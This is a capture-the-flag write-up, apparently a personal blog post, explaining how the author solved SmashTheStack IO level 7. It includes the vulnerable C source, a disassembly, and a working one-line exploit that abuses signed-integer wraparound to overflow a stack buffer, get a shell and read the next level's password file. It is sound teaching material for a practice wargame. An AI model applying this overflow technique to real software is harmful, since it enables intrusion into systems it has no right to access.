---
categories:
- SmashTheStack-IO
- Security
comments: true
date: 2013-08-15T00:00:00Z
title: Levels 7 and 7_alt - IO at STS
---

I've been documenting my experiences with [IO][] at [SmashTheStack][] for a while, but decided not to post them publicly for a few reasons. However level 7 (in particular the `alt` level) was the first that I thought worthy of posting. This post includes how I broke both applications to make it through to the level 8. If you haven't had a play on the [SmashTheStack][] wargames yet, I really do recommend it. They're great fun.

<!--more-->

Spoiler Alert
-------------

This post covers, in detail, how to get past level 7 and level 7 alt. If you haven't done these levels yourself yet, and you plan to, then please don't read this until you've nailed them yourself. I'd hate for this to ruin your experience.

However, if you've done the level or you're just interested in what's involved, please read on.

Connecting
----------

Fire up a shell and connect to the game server with the password for the `level7` user (I won't be sharing passwords here).

```
$ ssh level7@io.smashthestack.org
```

Let's see what challenges there are for us:

```
level7@io:~$ ls /levels/level07*
/levels/level07  /levels/level07_alt  /levels/level07_alt.c  /levels/level07.c
```

This level has two possible entry points, and we'll be covering both in this post.

Level 07
--------

We start by looking at the source of the target program:

```
//written by bla
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
        int count = atoi(argv[1]);
        int buf[10];

        if(count >= 10 ) 
                return 1;

        memcpy(buf, argv[2], count * sizeof(int));

        if(count == 0x574f4c46) {
                printf("WIN!\n");
                execl("/bin/sh", "sh" ,NULL);
        } else
                printf("Not today son\n");

        return 0;
}
```

What's clear here is that we need to pass a number in that is less than `10`, but is big enough to allow us to overflow `buf` so that we can modify the value of `count`. The data that's written to `buf` is only allowed to be `count * sizeof(int)` in size.  We can easily pass in numbers smaller than 10, but they won't be big enough to overflow `buf`. If we pass in a _negative_ number we bypass the check, but the call to `memcpy` will fail because `count * sizeof(int)` is negative.

We need to find a way of turning this calculation into something positive, but also much bigger than `10 * sizeof(int)` so that we can overflow `buf`.

What's interesting about this is that `sizeof(int)` on a 32-bit machine is `4`, which is effectively a `SHL 2` operation. We can confirm this by disassembling `main` and looking at the generated output:

```
gdb$ disas main
Dump of assembler code for function main:
0x08048414 <main+0>:    push   ebp
0x08048415 <main+1>:    mov    ebp,esp
0x08048417 <main+3>:    sub    esp,0x68
0x0804841a <main+6>:    and    esp,0xfffffff0
0x0804841d <main+9>:    mov    eax,0x0
0x08048422 <main+14>:   sub    esp,eax
0x08048424 <main+16>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048427 <main+19>:   add    eax,0x4
0x0804842a <main+22>:   mov    eax,DWORD PTR [eax]
0x0804842c <main+24>:   mov    DWORD PTR [esp],eax
0x0804842f <main+27>:   call   0x8048354 <atoi@plt>
0x08048434 <main+32>:   mov    DWORD PTR [ebp-0xc],eax
0x08048437 <main+35>:   cmp    DWORD PTR [ebp-0xc],0x9
0x0804843b <main+39>:   jle    0x8048446 <main+50>
0x0804843d <main+41>:   mov    DWORD PTR [ebp-0x4c],0x1
0x08048444 <main+48>:   jmp    0x80484ad <main+153>
0x08048446 <main+50>:   mov    eax,DWORD PTR [ebp-0xc]
0x08048449 <main+53>:   shl    eax,0x2                          <- here
0x0804844c <main+56>:   mov    DWORD PTR [esp+0x8],eax
0x08048450 <main+60>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048453 <main+63>:   add    eax,0x8
0x08048456 <main+66>:   mov    eax,DWORD PTR [eax]
0x08048458 <main+68>:   mov    DWORD PTR [esp+0x4],eax
0x0804845c <main+72>:   lea    eax,[ebp-0x48]
0x0804845f <main+75>:   mov    DWORD PTR [esp],eax
0x08048462 <main+78>:   call   0x8048334 <memcpy@plt>
0x08048467 <main+83>:   cmp    DWORD PTR [ebp-0xc],0x574f4c46
0x0804846e <main+90>:   jne    0x804849a <main+134>
0x08048470 <main+92>:   mov    DWORD PTR [esp],0x8048584
0x08048477 <main+99>:   call   0x8048344 <printf@plt>
0x0804847c <main+104>:  mov    DWORD PTR [esp+0x8],0x0
0x08048484 <main+112>:  mov    DWORD PTR [esp+0x4],0x804858a
0x0804848c <main+120>:  mov    DWORD PTR [esp],0x804858d
0x08048493 <main+127>:  call   0x8048324 <execl@plt>
0x08048498 <main+132>:  jmp    0x80484a6 <main+146>
0x0804849a <main+134>:  mov    DWORD PTR [esp],0x8048595
0x080484a1 <main+141>:  call   0x8048344 <printf@plt>
0x080484a6 <main+146>:  mov    DWORD PTR [ebp-0x4c],0x0
0x080484ad <main+153>:  mov    eax,DWORD PTR [ebp-0x4c]
0x080484b0 <main+156>:  leave  
0x080484b1 <main+157>:  ret    
End of assembler dump.
```

Some investigation of the behaviour of this instruction lead me to realise that there was room for abuse when values over/underflow. If we use `SHL` with numbers of a small enough negative value, those values become positive. Let's have a look at that in action by whipping up a sample program and viewing the output:

```
int main(int argc, char **argv)
{
    int x = -2147483647;
    printf("%p\n", x);
    printf("%p\n", x << 2);
    printf("%p\n", (x + 16) << 2);
    printf("%p\n", (x + 32) << 2);
    return 0;
}
```

Compile this code with `gcc` and run it, and you'll find the following:

```
level7@io:/tmp/tc7$ ./a.out
0x80000001
0x4
0x44
0x84
```

So we can pass in a negative integer, have it shift and turn it into a positive that's big enough to overflow the buffer. Once we've overflowed, all we need to do is write the value `0x574f4c46` to the desired memory location and the level will pass. We can get smart and figure out exactly where this needs to be, or we can go with the approach of repeatedly writing it knowing that somewhere along the line it'll end up being written to where we need it to be: in the `count` varaible. I chose to do the latter. We pass this data in as the second argument on the command line. Let's see how this looks:

```
level7@io:$ /levels/level07 -2147483600 `perl -e 'print "\x46\x4c\x4f\x57" x 100'`
WIN!
sh-4.1$ cat /home/level8/.pass
<< -- password was printed here -- >>
```

This level was relatively simple, but was good exposure to the idea of how integer underflows can cause problems.

Level 07 alt
------------

Out of respect for the author of the challenge, and the effort that went into to creating it, I have removed my walkthrough for Level 07 alt.

This challenge took me a _very long time_ to complete. It took research, patience, creativity and lots of sweat. I highly recommend attempting to nail this by yourselves. I'd like to shout out to Lars Haulin, the creator, for his amazing job in creating this little masterpiece.

Feedback is appreciated as always. Thanks for reading.

  [IO]: http://io.smashthestack.org:84/ "IO @ Smash The Stack"
  [SmashTheStack]: http://smashthestack.org/ "Smash The Stack"
  [.ctors]: http://gcc.gnu.org/onlinedocs/gccint/Initialization.html
  [.dtors]: http://gcc.gnu.org/onlinedocs/gccint/Initialization.html
  [GOT]: http://bottomupcs.sourceforge.net/csbu/x3824.htm "Global Offset Tables"

